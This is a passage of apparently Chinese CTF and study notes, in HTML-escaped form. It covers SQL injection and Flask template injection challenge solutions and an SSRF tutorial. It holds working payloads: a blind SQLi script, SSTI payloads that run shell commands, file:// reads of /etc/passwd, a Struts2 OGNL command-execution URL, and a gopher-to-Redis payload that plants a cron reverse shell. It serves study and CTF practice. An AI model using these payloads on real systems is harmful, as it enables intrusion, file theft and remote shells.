            &#39;passwd&#39;:&#39;||/**/passwd/**/regexp/**/&amp;quot;^&amp;#123;&amp;#125;&amp;quot;;\x00&#39;.format((pw+i))
        &amp;#125;
        res = requests.post(url=url,data=data).text
        if &amp;quot;alert&amp;quot; not in res:
            pw = pw + i
            print(pw)
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img data-src=&#34;../images/%5BNCTF2019%5DSQLi/6.png&#34; alt=&#34;6&#34;&gt;&lt;/p&gt;
&lt;p&gt;交到密码获得 flag：&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;../images/%5BNCTF2019%5DSQLi/7.png&#34; alt=&#34;7&#34;&gt;&lt;/p&gt;

 &lt;h2 id=&#34;rootersctf2019i_️_flask&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#rootersctf2019i_️_flask&#34;&gt;#&lt;/a&gt; [RootersCTF2019]I_❤️_Flask&lt;/h2&gt;
&lt;p&gt;&lt;img data-src=&#34;../images/%5BRootersCTF2019%5DI_3_Flask/1.png&#34; alt=&#34;1&#34;&gt;&lt;/p&gt;
&lt;p&gt;arjun 工具用于&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;../images/%5BRootersCTF2019%5DI_3_Flask/2.png&#34; alt=&#34;2&#34;&gt;&lt;/p&gt;
&lt;p&gt;这题没有过滤，直接用常规的注入语句即可&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;?name=&amp;#123;% for c in [].__class__.__base__.__subclasses__() %&amp;#125;&amp;#123;% if c.__name__==&#39;catch_warnings&#39; %&amp;#125;&amp;#123;&amp;#123; c.__init__.__globals__[&#39;__builtins__&#39;].eval(&#34;__import__(&#39;os&#39;).popen(&#39;cat flag.txt&#39;).read()&#34;) &amp;#125;&amp;#125;&amp;#123;% endif %&amp;#125;&amp;#123;% endfor %&amp;#125;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;拿到 flag&lt;br&gt;
&lt;img data-src=&#34;../images/%5BRootersCTF2019%5DI_3_Flask/3.png&#34; alt=&#34;3&#34;&gt;&lt;/p&gt;
&lt;p&gt;在该文件同地址的模板是这样的：&lt;/p&gt;
&lt;p&gt;但是如果是根目录就是：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&amp;#123;% for c in [].__class__.__base__.__subclasses__() %&amp;#125;
&amp;#123;% if c.__name__ == &#39;catch_warnings&#39; %&amp;#125;
  &amp;#123;% for b in c.__init__.__globals__.values() %&amp;#125;
  &amp;#123;% if b.__class__ == &amp;#123;&amp;#125;.__class__ %&amp;#125;
    &amp;#123;% if &#39;eva&#39;+&#39;l&#39; in b.keys() %&amp;#125;
      &amp;#123;&amp;#123; b[&#39;eva&#39;+&#39;l&#39;](&#39;__impor&#39;+&#39;t__&#39;+&#39;(&#34;o&#39;+&#39;s&#34;)&#39;+&#39;.pope&#39;+&#39;n&#39;+&#39;(&#34;ls /&#34;).read()&#39;) &amp;#125;&amp;#125;
    &amp;#123;% endif %&amp;#125;
  &amp;#123;% endif %&amp;#125;
  &amp;#123;% endfor %&amp;#125;
&amp;#123;% endif %&amp;#125;
&amp;#123;% endfor %&amp;#125;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;还可以：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&amp;#123;% for c in [].__class__.__base__.__subclasses__() %&amp;#125;&amp;#123;% if c.__name__==&#39;catch_warnings&#39; %&amp;#125;&amp;#123;&amp;#123; c.__init__.__globals__[&#39;__builtins__&#39;][&#39;__imp&#39;+&#39;ort__&#39;](&#39;o&#39;+&#39;s&#39;).listdir(&#39;/&#39;)&amp;#125;&amp;#125;&amp;#123;% endif %&amp;#125;&amp;#123;% endfor %&amp;#125;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;还可以用 fenjing 直接秒了：&lt;/p&gt;
&lt;p&gt;使用方法博客上有：&lt;/p&gt;
&lt;p&gt;直接秒了&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;../images/%5BRootersCTF2019%5DI_3_Flask/4.png&#34; alt=&#34;4&#34;&gt;&lt;/p&gt;

 &lt;h1 id=&#34;ssrf漏洞&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#ssrf漏洞&#34;&gt;#&lt;/a&gt; ssrf 漏洞&lt;/h1&gt;
&lt;h2 id=&#34;1ssrf是什么&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#1ssrf是什么&#34;&gt;#&lt;/a&gt; 1.ssrf 是什么？&lt;/h2&gt;
&lt;p&gt;ssrf（服务器端请求伪造）: 是一种由攻击者构造形成由服务端发起请求的一个安全漏洞。本质上是属于信息泄露漏洞&lt;/p&gt;
&lt;p&gt;一般情况下，SSRF 攻击的目标是从外网无法访问的内部系统。（正是因为它是由服务端发起的，所以它能够请求到与它相连而与外网隔离的内部系统）&lt;/p&gt;
&lt;h2 id=&#34;2ssrf漏洞原理&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#2ssrf漏洞原理&#34;&gt;#&lt;/a&gt; 2.SSRF 漏洞原理？&lt;/h2&gt;
&lt;p&gt;&lt;img data-src=&#34;C:%5CUsers%5C86182%5CDesktop%5CmyBlog%5Cassets%5Cimage-20240427204259939.png&#34; alt=&#34;image-20240427204259939&#34;&gt;&lt;/p&gt;
&lt;p&gt;意思是攻击者将一个代码是主机 A 向主机 b（内网的主机）发起请求访问文件&lt;/p&gt;
&lt;p&gt;SSRF 的形成大多是由于服务端提供了从其他服务器应用获取数据的功能且没有对目标地址做过滤与限制。例如，黑客操作服务端从指定 URL 地址获取网页文本内容，加载指定地址的图片等，利用的是服务端的请求伪造。SSRF 利用存在缺陷的 Web 应用作为代理攻击远程和本地的服务器。&lt;/p&gt;
&lt;h3 id=&#34;主要攻击方式&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#主要攻击方式&#34;&gt;#&lt;/a&gt; 主要攻击方式&lt;/h3&gt;
&lt;p&gt;对外网、服务器所在内网、本地进行端口扫描，获取一些服务的 banner 信息。&lt;/p&gt;
&lt;p&gt;攻击运行在内网或本地的应用程序。&lt;/p&gt;
&lt;p&gt;对内网 Web 应用进行指纹识别，识别企业内部的资产信息。&lt;/p&gt;
&lt;p&gt;攻击内外网的 Web 应用，主要是使用 HTTP GET 请求就可以实现的攻击 (比如 struts2、SQli 等)。&lt;/p&gt;
&lt;p&gt;利用 file 协议读取本地文件等。&lt;/p&gt;
&lt;p&gt;例如：&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3BheWxvYWRzLm5ldC9zc3JmLnBocD91cmw9MTkyLjE2OC4xLjEwOjMzMDY=&#34;&gt;http://payloads.net/ssrf.php?url=192.168.1.10:3306&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3BheWxvYWRzLm5ldC9zc3JmLnBocD91cmw9ZmlsZTovLy9jOi93aW5kb3dzL3dpbi5pbmk=&#34;&gt;http://payloads.net/ssrf.php?url=file:///c:/windows/win.ini&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;漏洞产生相关函数：&lt;/p&gt;
&lt;figure class=&#34;highlight php&#34;&gt;&lt;figcaption data-lang=&#34;PHP&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token function&#34;&gt;file_get_contents&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;、&lt;span class=&#34;token function&#34;&gt;fsockopen&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;、&lt;span class=&#34;token function&#34;&gt;curl_exec&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;、&lt;span class=&#34;token function&#34;&gt;fopen&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;、&lt;span class=&#34;token function&#34;&gt;readfile&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;（1）file_get_contents()&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&amp;lt;?php
$url = $_GET[&#39;url&#39;];;
echo file_get_contents($url);
?&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;code&gt;file_get_content&lt;/code&gt;  函数从用户指定的 url 获取内容，然后指定一个文件名 j 进行保存，并展示给用户。file_put_content 函数把一个字符串写入文件中。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;（2）fsockopen()&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&amp;lt;?php 
function GetFile($host,$port,$link) &amp;#123; 
    $fp = fsockopen($host, intval($port), $errno, $errstr, 30);   
    if (!$fp) &amp;#123; 
        echo &amp;quot;$errstr (error number $errno) \n&amp;quot;; 
    &amp;#125; else &amp;#123; 
        $out = &amp;quot;GET $link HTTP/1.1\r\n&amp;quot;; 
        $out .= &amp;quot;Host: $host\r\n&amp;quot;; 
        $out .= &amp;quot;Connection: Close\r\n\r\n&amp;quot;; 
        $out .= &amp;quot;\r\n&amp;quot;; 
        fwrite($fp, $out); 
        $contents=&#39;&#39;; 
        while (!feof($fp)) &amp;#123; 
            $contents.= fgets($fp, 1024); 
        &amp;#125; 
        fclose($fp); 
        return $contents; 
    &amp;#125; 
&amp;#125;
?&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;code&gt;fsockopen&lt;/code&gt;  函数实现对用户指定 url 数据的获取，该函数使用 socket（端口）跟服务器建立 tcp 连接，传输数据。变量 host 为主机名，port 为端口，errstr 表示错误信息将以字符串的信息返回，30 为时限&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;（3）curl_exec()&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;C:%5CUsers%5C86182%5CDesktop%5CmyBlog%5Cassets%5Cimage-20240427204517296.png&#34; alt=&#34;image-20240427204517296&#34;&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&amp;lt;?php 
if (isset($_POST[&#39;url&#39;]))&amp;#123;
    $link = $_POST[&#39;url&#39;];
    $curlobj = curl_init();// 创建新的 cURL 资源
    curl_setopt($curlobj, CURLOPT_POST, 0);
    curl_setopt($curlobj,CURLOPT_URL,$link);
    curl_setopt($curlobj, CURLOPT_RETURNTRANSFER, 1);// 设置 URL 和相应的选项
    $result=curl_exec($curlobj);// 抓取 URL 并把它传递给浏览器
    curl_close($curlobj);// 关闭 cURL 资源，并且释放系统资源

    $filename = &#39;./curled/&#39;.rand().&#39;.txt&#39;;
    file_put_contents($filename, $result); 
    echo $result;
&amp;#125;
?&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;code&gt;curl_exec&lt;/code&gt;  函数用于执行指定的 cURL 会话&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;strong&gt;注意：&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;1.一般情况下PHP不会开启fopen的gopher wrapper
2.file_get_contents的gopher协议不能URL编码
3.file_get_contents关于Gopher的302跳转会出现bug，导致利用失败
4.curl/libcurl 7.43 上gopher协议存在bug(%00截断) 经测试7.49 可用
5.curl_exec() //默认不跟踪跳转，
6.file_get_contents() // file_get_contents支持php://input协议
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;三-ssrf漏洞验证方式&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#三-ssrf漏洞验证方式&#34;&gt;#&lt;/a&gt; 三、SSRF 漏洞验证方式&lt;/h2&gt;
&lt;p&gt;3.1. 排除法：浏览器 f12 查看源代码看是否是在本地进行了请求&lt;/p&gt;
&lt;p&gt;比如：该资源地址类型为 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3d3dy54eHguY29tL2EucGhwP2ltYWdlPVVSTCxVUkwlRTUlOEYlODIlRTYlOTUlQjAlRTglOEIlQTUlRTYlOTglQUYlRTUlODUlQjYlRTQlQkIlOTYlRTYlOUMlOEQlRTUlOEElQTElRTUlOTklQTglRTUlOUMlQjAlRTUlOUQlODAlRTUlQjAlQjElRTUlOEYlQUYlRTglODMlQkQlRTUlQUQlOTglRTUlOUMlQThTU1JGJUU2JUJDJThGJUU2JUI0JTlF&#34;&gt;http://www.xxx.com/a.php?image=URL,URL 参数若是其他服务器地址就可能存在 SSRF 漏洞&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;3.2.dnslog 等工具进行测试，看是否被访问 (可以在盲打后台，用例中将当前准备请求的 url 和参数编码成 base64，这样盲打后台解码后就知道是哪台机器哪个 cgi 触发的请求)&lt;/p&gt;
&lt;p&gt;3.3. 抓包分析发送的请求是不是通过服务器发送的，如果不是客户端发出的请求，则有可能是存在漏洞。接着找存在 HTTP 服务的内网地址&lt;/p&gt;
&lt;p&gt;从漏洞平台中的历史漏洞寻找泄漏的存在 web 应用内网地址&lt;/p&gt;
&lt;p&gt;通过二级域名暴力猜解工具模糊猜测内网地址&lt;/p&gt;
&lt;p&gt;通过 file 协议读取内网信息获取相关地址&lt;/p&gt;
&lt;p&gt;3.4. 直接返回的 Banner、title、content 等信息&lt;/p&gt;
&lt;p&gt;3.5. 留意布尔型 SSRF，通过判断两次不同请求结果的差异来判断是否存在 SSRF，类似布尔型 sql 盲注方法。&lt;/p&gt;
&lt;h2 id=&#34;四-ssrf漏洞利用方式&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#四-ssrf漏洞利用方式&#34;&gt;#&lt;/a&gt; 四、SSRF 漏洞利用方式&lt;/h2&gt;
&lt;p&gt;4.1. 能扫描内部网络，获取端口，服务信息。&lt;br&gt;
4.2. 攻击运行在内网或本地的应用程序。&lt;br&gt;
4.3. 对内网 web 进行指纹识别&lt;br&gt;
 4.4. 对内部主机和端口发送请求包进行攻击&lt;br&gt;
 4.5. file 协议读取本地文件&lt;/p&gt;
&lt;p&gt;file 协议读取本地文件：&lt;/p&gt;
&lt;p&gt;file://  从文件系统中获取文件内容 ，如 file://etc/passwd&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;C:%5CUsers%5C86182%5CDesktop%5CmyBlog%5Cassets%5Cimage-20240427212513967.png&#34; alt=&#34;image-20240427212513967&#34;&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;http://124.12.2.1(将这个位数从一到254sniper一下)再file:///proc/net/arp第四个参数不是00:00:00:00:00:00就是有应答的，有该服务器，相当于知道了有哪些服务器是开着的。
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;要学arp协议&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#要学arp协议&#34;&gt;#&lt;/a&gt; 要学：arp 协议&lt;/h2&gt;
&lt;p&gt;dict:// 字典服务协议，访问字典资源，如 dict:///ip:6739/info:&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;C:%5CUsers%5C86182%5CDesktop%5CmyBlog%5Cassets%5Cimage-20240428122436384.png&#34; alt=&#34;image-20240428122436384&#34;&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;ftp:// 可用于网络端口扫描

sftp:// SSH文件传输协议或安全文件传输协议

Idap://  轻量级目录访问协议

tftp:// 简单文件传输协议

gopher://  分布式文档传递服务
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img data-src=&#34;C:%5CUsers%5C86182%5CDesktop%5CmyBlog%5Cassets%5Cimage-20240428123536693.png&#34; alt=&#34;image-20240428123536693&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;C:%5CUsers%5C86182%5CDesktop%5CmyBlog%5Cassets%5Cimage-20240428123839353.png&#34; alt=&#34;image-20240428123839353&#34;&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;请求端： curl gopher://127.0.0.1:7777/_abcd

接收端：nc -lvp 7777  (监听7777端口)（要先开）
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img data-src=&#34;C:%5CUsers%5C86182%5CDesktop%5CmyBlog%5Cassets%5Cimage-20240428124311538.png&#34; alt=&#34;image-20240428124311538&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;C:%5CUsers%5C86182%5CDesktop%5CmyBlog%5Cassets%5Cimage-20240428131834835.png&#34; alt=&#34;image-20240428131834835&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;C:%5CUsers%5C86182%5CDesktop%5CmyBlog%5Cassets%5Cimage-20240428132215918.png&#34; alt=&#34;image-20240428132215918&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;五-ssrf漏洞点挖掘&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#五-ssrf漏洞点挖掘&#34;&gt;#&lt;/a&gt; 五、SSRF 漏洞点挖掘&lt;/h2&gt;
&lt;p&gt;5.1. 社交分享 功能：获取超链接的标题等内容进行显示&lt;/p&gt;
&lt;p&gt;5.2. 转码服务：通过 URL 地址把原地址的网页内容调优使其适合手机屏幕浏览&lt;/p&gt;
&lt;p&gt;5.3. 在线翻译：给网址翻译对应网页的内容&lt;/p&gt;
&lt;p&gt;5.4. 图片加载 / 下载：例如富文本编辑器中的点击下载图片到本地；通过 URL 地址加载或下载图片&lt;/p&gt;
&lt;p&gt;5.5. 图片 / 文章收藏功能：主要其会取 URL 地址中 title 以及文本的内容作为显示以求一个好的用具体验&lt;/p&gt;
&lt;p&gt;5.6. 云服务厂商：它会远程执行一些命令来判断网站是否存活等，所以如果可以捕获相应的信息，就可以进行 ssrf 测试&lt;/p&gt;
&lt;p&gt;5.7. 网站采集，网站抓取的地方：一些网站会针对你输入的 url 进行一些信息采集工作&lt;/p&gt;
&lt;p&gt;5.8. 数据库内置功能：数据库的比如 mongodb 的 copyDatabase 函数&lt;/p&gt;
&lt;p&gt;5.9. 邮件系统：比如接收邮件服务器地址&lt;/p&gt;
&lt;p&gt;5.10. 编码处理，属性信息处理，文件处理：比如 ffpmg，ImageMagick，docx，pdf，xml 处理器等&lt;/p&gt;
&lt;p&gt;5.11. 未公开的 api 实现以及其他扩展调用 URL 的功能：可以利用 google 语法加上这些关键字去寻找 SSRF 漏洞&lt;/p&gt;
&lt;p&gt;5.12. 从远程服务器请求资源（upload from url 如 discuz！；import &amp;amp; expost rss feed 如 web blog；使用了 xml 引擎对象的地方 如 wordpress xmlrpc.php）&lt;/p&gt;
&lt;p&gt;URL 关键字：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;pre&gt;&lt;code&gt;Share、wap、url、link、src、source、target、u、3g、display、sourceURL、imageURL、domain
&lt;/code&gt;&lt;/pre&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;a href=&#34;https://img2020.cnblogs.com/blog/1423858/202010/1423858-20201031183029092-1483142120.png&#34;&gt;&lt;img data-src=&#34;https://img2020.cnblogs.com/blog/1423858/202010/1423858-20201031183029092-1483142120.png&#34; alt=&#34;img&#34;&gt;&lt;/a&gt;&lt;/p&gt;
&lt;h1 id=&#34;61-ssrf利用的协议&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#61-ssrf利用的协议&#34;&gt;#&lt;/a&gt; 6.1. SSRF 利用的协议&lt;/h1&gt;
&lt;p&gt;（&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;1）file：在有回显的情况下，利用 file 协议可以读取任意内容

（2）dict：泄露安装软件版本信息，查看端口，操作内网redis服务等

（3）gopher：gopher支持发出GET、POST请求：可以先截获get请求包和post请求包，再构造成符合gopher协议的请求。gopher协议是ssrf利用中一个最强大的协议(俗称万能协议)。可用于反弹shell

（4）http/s：探测内网主机存活
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;62-攻击运行在内网或本地的应用程序&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#62-攻击运行在内网或本地的应用程序&#34;&gt;#&lt;/a&gt; 6.2. 攻击运行在内网或本地的应用程序&lt;/h2&gt;
&lt;p&gt;&lt;strong&gt;本地利用方式：&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;（1）使用 file 协议 file protocol (任意文件读取)&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;curl -vvv &amp;quot;http://target/ssrf.php?url=file:///etc/passwd&amp;quot;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;（2）使用 dict 协议 dict protocol (获取 Redis 配置信息)&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;curl -vvv &amp;quot;http://target/ssrf.php?url=dict://127.0.0.1:6379/info&amp;quot;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;（3）使用 gopher 协议 (俗称万能协议) gopher protocol (一键反弹 Bash)&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;curl -vvv &amp;quot;http://target/ssrf.php?url=gopher://127.0.0.1:6379/_*1 %0d %0a $8%0d %0aflushall %0d %0a*3 %0d %0a $3%0d %0aset %0d %0a $1%0d %0a1 %0d %0a $64%0d %0a %0d %0a %0a %0a*/1 * * * * bash -i &amp;gt;&amp;amp; /dev/tcp/127.0.0.1/4444 0&amp;gt;&amp;amp;1 %0a %0a %0a %0a %0a %0d %0a %0d %0a %0d %0a*4 %0d %0a $6%0d %0aconfig %0d %0a $3%0d %0aset %0d %0a $3%0d %0adir %0d %0a $16%0d %0a/var/spool/cron/ %0d %0a*4 %0d %0a $6%0d %0aconfig %0d %0a $3%0d %0aset %0d %0a $10%0d %0adbfilename %0d %0a $4%0d %0aroot %0d %0a*1 %0d %0a $4%0d %0asave %0d %0aquit %0d %0a&amp;quot;
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;63-扫描内部网络获取端口服务信息&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#63-扫描内部网络获取端口服务信息&#34;&gt;#&lt;/a&gt; 6.3. 扫描内部网络，获取端口，服务信息&lt;/h2&gt;
&lt;pre&gt;&lt;code&gt;构造IP:PORT进行访问

探测内网IP192.168.1.124的80端口（这里用的是http协议当然也可以把http更换成dict协议去探测开放端口）
&lt;/code&gt;&lt;/pre&gt;
&lt;pre&gt;&lt;code&gt;http://localhost/ssrf.php?url=http://192.168.1.124:80
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;a href=&#34;https://img2020.cnblogs.com/blog/1423858/202112/1423858-20211207161427117-1221456175.png&#34;&gt;&lt;img data-src=&#34;https://img2020.cnblogs.com/blog/1423858/202112/1423858-20211207161427117-1221456175.png&#34; alt=&#34;img&#34;&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;探测个 3306 端口&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;http://localhost/ssrf.php?url=http://192.168.1.124:3306
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;a href=&#34;https://img2020.cnblogs.com/blog/1423858/202112/1423858-20211207161509597-527770927.png&#34;&gt;&lt;img data-src=&#34;https://img2020.cnblogs.com/blog/1423858/202112/1423858-20211207161509597-527770927.png&#34; alt=&#34;img&#34;&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;随便探测一个端口（这里这个 5357 是开放的）&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;http://localhost/ssrf.php?url=http://192.168.1.124:5357
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;a href=&#34;https://img2020.cnblogs.com/blog/1423858/202112/1423858-20211207161534747-1833187621.png&#34;&gt;&lt;img data-src=&#34;https://img2020.cnblogs.com/blog/1423858/202112/1423858-20211207161534747-1833187621.png&#34; alt=&#34;img&#34;&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;有一些端口服务的 banner 有就会探测到输出到页面上，或者开放的端口访问的状态码是 5 开头 (500、501、503…) 或者 4 开头 (403、404…) 等。端口未开放访问的网页的时间会比较长&lt;/strong&gt;&lt;/p&gt;
&lt;h2 id=&#34;64-对内网web进行指纹识别&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#64-对内网web进行指纹识别&#34;&gt;#&lt;/a&gt; 6.4. 对内网 web 进行指纹识别&lt;/h2&gt;
&lt;p&gt;通过构造一些 cms 的特征图片、目录、文件等去进行请求，如果内网 192.168.1.124 这台服务 8080 端口存在 phpmyadmin，访问就会出现该图片&lt;/p&gt;
&lt;p&gt;其他的同理&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;- http://192.168.1.124:8080/phpMyAdmin/themes/original/img/b_tblimport.png
- http://192.168.1.124:8081/wp-content/themes/default/images/audio.jpg
- http://192.168.1.124:8082/profiles/minimal/translations/README.txt

**。
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;65-对内部主机和端口发送请求包进行攻击&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#65-对内部主机和端口发送请求包进行攻击&#34;&gt;#&lt;/a&gt; 6.5. 对内部主机和端口发送请求包进行攻击&lt;/h2&gt;
&lt;p&gt;这里是用 get 方法可以攻击的 web，比如 struts2 命令执行、Thinkphp、Jboss 等。&lt;/p&gt;
&lt;p&gt;以下是针对内网 192.168.1.139 这台服务器进行攻击，执行命令 whoami&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;http://localhost/ssrf.php?url=http://192.168.1.139:8081/$&amp;#123;%23context[&#39;xwork.MethodAccessor.denyMethodExecution&#39;]=false,%23f=%23_memberAccess.getClass().getDeclaredField(&#39;allowStaticMethodAccess&#39;),%23f.setAccessible(true),%23f.set(%23_memberAccess,true),@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(&#39;whoami&#39;).getInputStream())&amp;#125;.action
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;post 方法我们可以用 gophar 协议去发送请求数据包&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;http://localhost/ssrf.php?url=gopher://192.168.1.124:6667/_POST%20%2findex.php%20HTTP%2f1.1%250d%250aHost%3A%20127.0.0.1%3A2233%250d%250aConnection%3A%20close%250d%250aContent-Type%3A%20application%2fx-www-form-urlencoded%250d%250a%250d%250ausername%3Dadmin%26password%3Dpassword
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;66-file协议读取本地文件52有写&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#66-file协议读取本地文件52有写&#34;&gt;#&lt;/a&gt; 6.6. file 协议读取本地文件（5.2 有写）&lt;/h2&gt;
&lt;p&gt;这里的构成可以通过 url 参数接收，去尝试请求内网资源&lt;/p&gt;
&lt;p&gt;Windows:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;http://localhost/ssrf.php?url=file:///c:\\windows\\csup.txt
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Linux:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;http://localhost/ssrf.php?url=file:////etc/csup.txt
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;file 协议利用，这里读取 windows 目录下的 csup.txt 文件内容&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://img2020.cnblogs.com/blog/1423858/202112/1423858-20211207160745146-1196790833.png&#34;&gt;&lt;img data-src=&#34;https://img2020.cnblogs.com/blog/1423858/202112/1423858-20211207160745146-1196790833.png&#34; alt=&#34;img&#34;&gt;&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&#34;67-ssrf攻击redis&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#67-ssrf攻击redis&#34;&gt;#&lt;/a&gt; 6.7. SSRF 攻击 Redis&lt;/h2&gt;
&lt;p&gt;这里要搞懂两个知识点：1、gopher 协议  2、redis 的数据包转换字符串&lt;/p&gt;
&lt;p&gt;1、gopher 协议&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;推荐文章：https://zhuanlan.zhihu.com/p/112055947
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;2、redis 的数据包转换字符串&lt;/p&gt;
&lt;p&gt;redis 服务开启一个抓包监听本地 6379 端口：&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://img2020.cnblogs.com/blog/1423858/202112/1423858-20211226121513024-458922385.png&#34;&gt;&lt;img data-src=&#34;https://img2020.cnblogs.com/blog/1423858/202112/1423858-20211226121513024-458922385.png&#34; alt=&#34;img&#34;&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;用 kali linux 进行连接并执行个 info 命令：&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://img2020.cnblogs.com/blog/1423858/202112/1423858-20211226121622474-1794703743.png&#34;&gt;&lt;img data-src=&#34;https://img2020.cnblogs.com/blog/1423858/202112/1423858-20211226121622474-1794703743.png&#34; alt=&#34;img&#34;&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;接下来拿到本地用 wireshark 分析下数据包，追踪下 TCP 流：&lt;/p&gt;
